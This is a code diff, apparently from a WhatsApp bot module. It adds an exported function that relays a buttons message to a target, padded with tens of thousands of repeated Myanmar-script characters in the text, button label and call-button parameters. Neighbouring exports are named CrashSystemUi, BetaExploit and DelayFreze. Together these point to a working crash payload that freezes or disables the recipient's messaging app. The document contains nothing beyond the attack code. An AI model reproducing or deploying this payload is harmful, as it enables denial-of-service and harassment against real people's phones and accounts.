@@ -3622,6 +3622,29 @@ async function CrashSystemUi(target) {
     } catch (err) {
     }
 }
+//Blank Func
+async function yhcv(sock, target) {
+  await sock.relayMessage(target, {
+    buttonsMessage: {
+      contentText: "📞*" + "ြ".repeat(40000) + "*p",
+      footerText: "eak",
+      headerType: 1,
+      buttons: [
+        {
+          buttonId: "call_us",
+          buttonText: { displayText: "ြ".repeat(40000) },
+          type: 1,
+          nativeFlowInfo: {
+            name: "cta_call",
+            paramsJson: JSON.stringify({
+              display_text: "ြ".repeat(60000),
+            })
+          }
+        }
+      ]
+    }
+  }, { messageId: null });
+}
 module.exports = {
   // Session management
   activeConnections,
@@ -3700,4 +3723,5 @@ BetaExploit,
   //New Module
   DelayFreze,
   CrashSystemUi,
+  yhcv,
 };
